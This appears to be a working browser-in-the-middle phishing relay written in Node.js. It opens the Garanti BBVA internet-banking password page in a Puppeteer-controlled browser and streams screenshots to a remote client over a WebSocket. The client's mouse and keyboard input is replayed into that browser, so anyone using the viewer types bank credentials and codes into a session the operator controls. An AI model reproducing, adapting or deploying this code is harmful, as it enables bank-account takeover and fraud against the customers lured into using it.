const http = require('http');
const puppeteer = require('puppeteer');
const WebSocketServer = require('websocket').server;

const server = http.createServer();
server.listen(8080);

const wsServer = new WebSocketServer({
    httpServer: server
});

let page = null;
let connection = null;

wsServer.on('request', function (request) {
    connection = request.accept(null, request.origin);

    connection.on('message', function (message) {
        const msg = JSON.parse(message.utf8Data);
        switch (msg.command) {
            case 'start':
                dimensions = msg.args;
                startBrowser(dimensions);
                break;
            case 'event':
                const e = msg.args.event;
                switch (e.type) {
                    case 'mousemove':
                        moveMouse(e.clientX, e.clientY);
                        break;
                    case 'mouseup':
                        clickMouse();
                        break;
                    case 'keyup':
                        sendKey(e.key);
                        break;
                }
                break;
        }
    });

    connection.on('close', function (reasonCode, description) {
        console.log('Client has disconnected.');
    });
});

async function startBrowser(dimensions) {
    const browser = await puppeteer.launch({
        headless: false,
        args: [
            `--window-size=${dimensions.width},${dimensions.height}`,
        ],
    });

    page = await browser.newPage({
        viewport: null
    });
    page.on('domcontentloaded', pageLoaded);
    await page.setViewport({
        width: dimensions.width,
        height: dimensions.height,
    });
    await page.goto('https://sube.garantibbva.com.tr/isube/login/login/passwordentrypersonal-en', {
        timeout: 0,
        waitUntil: 'domcontentloaded'
    });
    await startStreamer();
}

async function startStreamer() {
    setInterval(async function () {
        const base64Image = await page.screenshot({
            encoding: "base64"
        })
        connection.send(JSON.stringify({
            command: 'update',
            data: base64Image
        }));
    }, 33);
}

async function pageLoaded() {
    connection.send(JSON.stringify({
        command: 'loaded',
        data: await page.title()
    }));
}

async function moveMouse(x, y) {
    await page.mouse.move(x, y);
}

async function clickMouse() {
    await page.mouse.down();
    await page.mouse.up();
}

async function sendKey(key) {
    await page.keyboard.press(key);
}